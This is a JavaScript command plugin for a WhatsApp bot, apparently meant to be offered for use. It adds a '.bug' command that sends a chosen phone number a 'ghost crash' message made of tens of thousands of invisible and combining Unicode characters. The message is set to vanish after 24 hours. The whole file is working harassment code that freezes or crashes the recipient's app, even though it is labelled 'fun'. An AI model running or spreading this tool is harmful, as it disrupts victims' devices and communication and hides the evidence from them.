const { cmd } = require('../lib/command');
const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");

cmd({
  pattern: "bug",
  use: ".bug <number>",
  category: "fun",
  desc: "Send Ghost + Crash Bug (silent invisible text)",
  filename: __filename
}, async (conn, m, mek, { args, reply }) => {
  if (!args[0]) return await reply("*Provide a number!* (ex: .bug 9471xxxxxxx)");

  let target = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // 👻 Invisible Unicode + crash sequence
  let crashText = "\u2063".repeat(10000) + "꧁༒☬CRASH☬༒꧂" + "꧀".repeat(25000);

  try {
    const ghostCrashMsg = await generateWAMessageFromContent(target, {
      conversation: crashText
    }, {
      quoted: null,
      ephemeralExpiration: 86400, // 👻 Delete after 24h (optional)
      messageId: undefined
    });

    await conn.relayMessage(target, ghostCrashMsg.message, { messageId: ghostCrashMsg.key.id });

    await reply("✅ Ghost Crash Bug sent to: " + target);
  } catch (e) {
    console.error(e);
    await reply("❌ Failed to send bug message.");
  }
});
